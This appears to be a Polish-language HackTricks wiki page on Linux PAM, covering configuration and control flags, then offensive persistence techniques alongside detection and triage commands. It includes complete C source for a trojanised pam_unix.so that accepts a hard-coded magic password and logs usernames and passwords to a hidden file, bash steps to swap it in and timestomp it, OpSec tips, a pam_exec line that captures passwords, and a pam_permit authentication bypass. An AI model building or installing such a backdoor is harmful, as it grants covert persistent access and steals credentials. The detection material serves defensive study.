# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Podstawowe informacje

**PAM (Pluggable Authentication Modules)** to mechanizm bezpieczeństwa, który **weryfikuje tożsamość użytkowników próbujących uzyskać dostęp do usług komputerowych** i kontroluje ich dostęp na podstawie różnych kryteriów. Działa jak cyfrowy strażnik, dbając o to, by z określonych usług mogli korzystać wyłącznie uprawnieni użytkownicy, a jednocześnie może ograniczać ich użycie, aby zapobiegać przeciążeniu systemu.

#### Pliki konfiguracyjne

- **Solaris** obsługuje starszy centralny plik `/etc/pam.conf`, ale aktualne zalecenia preferują pliki usług w katalogu `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Systemy Linux** preferują podejście katalogowe, przechowując konfiguracje poszczególnych usług w katalogu `/etc/pam.d`. Na przykład plik konfiguracyjny usługi login znajduje się w `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Przykładowa konfiguracja PAM dla usługi login może wyglądać tak:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Obszary zarządzania PAM**

Te obszary, czyli grupy zarządzania, obejmują **auth**, **account**, **password** i **session**, z których każdy odpowiada za inny aspekt procesu uwierzytelniania i zarządzania sesją:<sup>[[1]](#references)</sup>

- **Auth**: Weryfikuje tożsamość użytkownika, często prosząc o hasło.
- **Account**: Obsługuje weryfikację konta, sprawdzając warunki takie jak członkostwo w grupie lub ograniczenia czasowe.
- **Password**: Zarządza aktualizacją haseł, w tym sprawdzaniem złożoności i zapobieganiem atakom słownikowym.
- **Session**: Zarządza działaniami podczas rozpoczynania lub kończenia sesji usługi, takimi jak montowanie katalogów lub ustawianie limitów zasobów.

#### **Kontrole modułów PAM**

Kontrole określają reakcję modułu na powodzenie lub niepowodzenie, wpływając na cały proces uwierzytelniania. Obejmują one:<sup>[[1]](#references)</sup>

- **Required**: Niepowodzenie wymaganego modułu ostatecznie skutkuje niepowodzeniem, ale dopiero po sprawdzeniu wszystkich kolejnych modułów.
- **Requisite**: Natychmiastowe zakończenie procesu w przypadku niepowodzenia.
- **Sufficient**: Jeśli żaden wcześniejszy moduł `required` nie zakończył się niepowodzeniem, powodzenie natychmiast kończy proces i pomija pozostałe moduły w tej samej grupie zarządzania.
- **Optional**: Powoduje niepowodzenie tylko wtedy, gdy jest jedynym modułem w stosie.

#### Istotne aspekty ofensywne

Podczas analizy lub modyfikowania PAM **miejsce wstawienia reguły** określa, który stos ją obsłuży:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` i `substack` pobierają reguły z innych plików, więc edycja `sshd` może wpłynąć tylko na SSH, podczas gdy edycja `system-auth`, `common-auth` lub innego współdzielonego stosu może wpłynąć jednocześnie na kilka usług.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM obsługuje również kontrole w nawiasach kwadratowych, takie jak `[success=1 default=ignore]`. Można je wykorzystać do **pominięcia jednego lub kilku modułów** po pomyślnym przejściu niestandardowej kontroli, zamiast jawnie zastępować `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` może być **bezwzględna** (`/usr/lib/security/pam_custom.so`) lub **względna** względem domyślnego katalogu modułów PAM. Współczesne systemy Linux często używają katalogów `/lib/security`, `/lib64/security`, `/usr/lib/security` lub ścieżek multiarch, takich jak `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Wskazówka dla operatora: przed wprowadzeniem zmian zawsze prześledź **pełny graf usług**. Na przykład `sshd -> password-auth -> system-auth` w niektórych dystrybucjach albo `sshd -> system-remote-login -> system-login -> system-auth` w innych oznacza, że ta sama jednolinijkowa implantacja może mieć znacznie szerszy zasięg, niż zamierzano.<sup>[[1]](#references)[[13]](#references)</sup>

Niestandardowy moduł `auth` może dodać interaktywne wyzwanie do `sudo`, pojawiające się po haśle do konta. Przed ręcznym przejrzeniem wyzwania sprawdź aktywny stos `/etc/pam.d/sudo`, dołączoną politykę, argumenty modułu oraz uprawnienia do każdego wskazanego lokalnego pliku z danymi. Sama dostępna do odczytu lista słów używanych w wyzwaniu nie omija kontroli hasła ani nie nadaje uprawnień sudoers. Przejście do uprawnień uprzywilejowanych nadal wymaga poprawnego uwierzytelnienia konta, przejścia wszystkich wymaganych etapów PAM oraz reguły sudo umożliwiającej uzyskanie uprawnień roota; automatyczne rozpoznanie nie powinno wywoływać wyzwania.

W przypadku historycznej luki w uprawnieniach `pam_motd` w Ubuntu ([CVE-2010-0832](https://ubuntu.com/security/cve-2010-0832)) sprawdź faktycznie zainstalowaną kompilację `libpam-modules` oraz to, czy usługa logowania wywołuje podatny moduł sesji. Ubuntu naprawiło ją w wersji **1.1.0-2ubuntu1.1** dla 9.10 i **1.1.1-2ubuntu5** dla 10.04 LTS; inne wydania i poprawki przeniesione przez dostawcę wymagają osobnej oceny pakietu. Opisany scenariusz wymagał, aby użytkownik zastąpił swój katalog domowy `.cache` dowiązaniem symbolicznym, a następnie wywołał logowanie przez PAM, co powodowało, że stary moduł zmieniał właściciela chronionego obiektu. Sama obecność `.cache`, wpisu `pam_motd.so` lub starej wersji jądra nie potwierdza podatności; podczas pasywnego rozpoznania sprawdź kontrolę nad katalogiem domowym, aktywną wersję modułu, możliwość wywołania logowania, obsługę dowiązań symbolicznych i uprawnienia do celu, nie zastępując plików ani nie rozpoczynając logowania. Zobacz [komunikat bezpieczeństwa Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Przykładowy scenariusz

W konfiguracji z wieloma modułami `auth` proces przebiega w ściśle określonej kolejności. Jeśli moduł `pam_securetty` wykryje, że terminal logowania jest niedozwolony, logowania roota zostaną zablokowane, ale wszystkie moduły i tak zostaną przetworzone ze względu na status "required". `pam_env` ustawia zmienne środowiskowe, co może poprawić wygodę użytkownika. Moduły `pam_ldap` i `pam_unix` współpracują przy uwierzytelnianiu użytkownika, a `pam_unix` próbuje użyć wcześniej podanego hasła, zwiększając wydajność i elastyczność metod uwierzytelniania.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` w stosie usługi

`pam_permit.so` zwraca powodzenie kontroli PAM. Jeśli użytkownik o niższych uprawnieniach może modyfikować aktywną politykę PAM usługi, wstawienie tego modułu z flagą sterującą, która przerywa stos uwierzytelniania, może usunąć kontrolę hasła dla tej usługi. W przypadku `sudo` przed określeniem, których usług dotyczy zmiana, sprawdź `/etc/pam.d/sudo` oraz każdy dołączony plik `common-auth` lub `system-auth`. Ominięcie uwierzytelniania PAM **nie** nadaje nowych uprawnień sudoers; użytkownik nadal musi mieć uprawnienia do uruchomienia żądanego polecenia. Sprawdź kolejność reguł i wszelkie wcześniejsze błędy modułów `required`, zamiast zakładać, że pojedynczy wiersz `sufficient pam_permit.so` zawsze zakończy się powodzeniem.

## Backdooring PAM – podpinanie `pam_unix.so`

Klasyczną sztuczką zapewniającą trwałość w ważnych środowiskach Linux jest **zastąpienie legalnej biblioteki PAM podłożoną wersją**. Na hoście, którego stos PAM ładuje `pam_unix.so`, uwierzytelnianie przez SSH lub konsolę może wywołać jego punkt wejścia `pam_sm_authenticate()`; złośliwy zamiennik może przechwytywać poświadczenia lub implementować obejście oparte na *magicznym* haśle.<sup>[[2]](#references)[[11]](#references)</sup>

### Ściągawka kompilacji
Poniższy szkic wykorzystuje punkt wejścia usługi `pam_sm_authenticate()` z Linux-PAM oraz `pam_get_authtok()` do uzyskania tokenu uwierzytelniającego.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Przykładowy trojan `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Skompiluj i potajemnie podmień (wzorzec podmiany/timestomp został opisany przez Unit 42). Dostosuj zarówno ścieżkę kopii zapasowej zakodowaną na stałe w wrapperze, jak i poniższe polecenia do rzeczywistego katalogu modułów PAM na systemie docelowym:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Wskazówki OpSec
1. **Atomowe nadpisanie** – zapisz kompletną bibliotekę do pliku tymczasowego i zmień jego nazwę, aby zastąpić oryginał. Dzięki temu unikniesz pozostawienia częściowo zapisanego modułu uwierzytelniania.
2. Ścieżkę taką jak `/usr/bin/.dbus.log` zaobserwowano w analizie AuthDoor przeprowadzonej przez Unit 42, więc jest też przydatnym wskaźnikiem w threat huntingu.<sup>[[2]](#references)</sup>
3. Zachowaj punkty wejścia oczekiwane przez stos PAM (na przykład `pam_sm_authenticate` i `pam_sm_setcred`), aby inne operacje zarządzania nadal działały.<sup>[[11]](#references)[[18]](#references)</sup>

### Wykrywanie
Podczas sprawdzania integralności pakietów RPM weryfikuje metadane zainstalowanych plików, `debsums -s` zgłasza błędy sum kontrolnych, a `dpkg -S` w bloku triage sprawdza, do którego pakietu należy plik; składnia reguły audit watch rejestruje zapisy do ścieżki i zmiany jej atrybutów.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Porównaj MD5/SHA256 pliku `pam_unix.so` z wersją z pakietu dystrybucji.
* Użyj `rpm -V pam` lub `debsums -s libpam-modules`, aby wykryć podmienione biblioteki bez ręcznego obliczania sum.
* Sprawdź, czy w `/lib/security/` nie ma plików z prawem zapisu dla wszystkich ani nietypowym właścicielem.
* Reguła `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Wyszukaj nieoczekiwane moduły w konfiguracjach PAM: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

To wyszukiwanie `pam_` nie wykrywa niestandardowych modułów o innych nazwach bazowych `.so`. Sprawdź **aktywne** wiersze `auth`, `account`, `password` i `session` w `/etc/pam.d` (oraz `/etc/pam.conf`, jeśli jest używany), uwzględniając ich flagę sterującą i wszystkie dołączone stosy. Nieznany moduł umieszczony jako `auth sufficient` przed standardowym sprawdzeniem hasła wymaga sprawdzenia, do którego pakietu należy, oraz analizy pliku binarnego; [składnia sterująca PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) może spowodować, że powodzenie zakończy tę część stosu przedwcześnie. Sama nazwa modułu, nietypowy znacznik czasu lub opcja `nodelay` nie dowodzą obejścia. Jeśli zachowanie wskazuje na wyciek informacji o czasie, najpierw sprawdź implementację i dostępność usługi; rutynowe rozpoznanie nie powinno polegać na wielokrotnym wysyłaniu prób uwierzytelnienia.

### Polecenia do szybkiego triage (po przejęciu systemu lub podczas threat huntingu)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Nadużywanie `pam_exec` do utrzymania dostępu
Zamiast zastępować `pam_unix.so`, można mniej inwazyjnie dodać linię `pam_exec` w `/etc/pam.d/sshd`, aby wywołanie, które do niej dotrze, uruchamiało helpera, pozostawiając normalny stos bez zmian.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` otrzymuje metadane PAM w zmiennych środowiskowych, takich jak `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` i `PAM_TYPE`. Przy użyciu `expose_authtok` helper może odczytać ze `stdin` do `PAM_MAX_RESP_SIZE` bajtów hasła podczas faz `auth` lub `password`. Aby helper działał z efektywnym UID zamiast rzeczywistego UID, dodaj `seteuid`.<sup>[[4]](#references)</sup>

Praktyczne wskazówki dotyczą typów modułów i filtra `type=`, udokumentowanych dla `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` lepiej sprawdza się przy **działaniach po zalogowaniu**, takich jak ponowne otwieranie socketów lub uruchamianie odłączonego demona.
- `auth optional pam_exec.so quiet expose_authtok ...` to typowy wybór do **przechwytywania danych uwierzytelniających**, ponieważ działa przed otwarciem sesji.
- `type=session` lub `type=auth` pozwala ograniczyć wykonanie do określonej fazy PAM i uniknąć niepotrzebnego podwójnego wykonania.

Podczas przeglądu uprawnień bezwzględna ścieżka do helpera `pam_exec.so`, do której bieżący użytkownik ma prawo zapisu, jest potencjalnym zagrożeniem nawet wtedy, gdy plik ma ustawiony atrybut append-only (`a`): [ten atrybut pozwala dopisywać dane](https://man7.org/linux/man-pages/man1/chattr.1.html), co może wystarczyć do zmiany późniejszego działania skryptu powłoki. Najpierw potwierdź, że dana usługa PAM i zdarzenie rzeczywiście docierają do tej linii, helper i jego ścieżka nadrzędna są zaufane, a polecenie działa z bardziej uprzywilejowaną tożsamością; [`seteuid` zmienia, którego UID PAM używa](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Sam plik z prawem zapisu lub wynik `lsattr` nie dowodzi uprzywilejowanego wykonania.

### Przetrwanie narzędzi dystrybucji: `authselect`

W systemach z rodziny RHEL i Fedora korzystających z `authselect` bezpośrednie zmiany w generowanych plikach, takich jak `/etc/pam.d/system-auth` lub `/etc/pam.d/password-auth`, mogą zostać **nadpisane przez `authselect`**. Aby zapewnić trwałość zmian, operatorzy często modyfikują aktywny profil niestandardowy w `/etc/authselect/custom/<profile>/`, a następnie wybierają go ponownie.<sup>[[5]](#references)[[19]](#references)</sup>

Typowy przebieg pracy, gdy masz uprawnienia root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Ma to znaczenie zarówno dla ofensywy, jak i triage: jeśli `/etc/pam.d/system-auth` zawiera baner `Generated by authselect` i `Do not modify this file manually`, rzeczywisty punkt utrwalenia może znajdować się w `/etc/authselect/custom/`, a nie w `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Niedawno zaobserwowane techniki

Najnowsze doniesienia z 2025 r. na temat linuksowego backdoora **Plague** pokazały dalsze rozwinięcie tej samej podstawowej koncepcji: złośliwy komponent PAM ze **statycznym hasłem obejścia**, a także czyszczenie zmiennych środowiskowych związanych z SSH i historii powłoki (`HISTFILE=/dev/null`), aby ograniczyć ślady sesji po zalogowaniu.<sup>[[3]](#references)</sup> To przydatny wzorzec do wykrywania, ponieważ logika backdoora może być w PAM, a artefakty maskujące mogą pojawiać się dopiero **po** pomyślnym uwierzytelnieniu.


## References

- [1] [pam.conf(5) / pam.d(5) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Podręcznik tajnego operatora: infiltracja globalnych sieci telekomunikacyjnych - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: nowo odkryty backdoor dla Linuksa oparty na PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Konfigurowanie uwierzytelniania użytkowników za pomocą authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - strony podręcznika Debiana](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - strona podręcznika Linuksa](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - strony podręcznika Debiana](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Zarządzanie uwierzytelnianiem w Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Przewodnik po uwierzytelnianiu na poziomie systemu - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista plików pakietu Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - strony podręcznika Debiana](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Podręcznik Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Zmiany/Obowiązkowe użycie Authselect - Wiki projektu Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
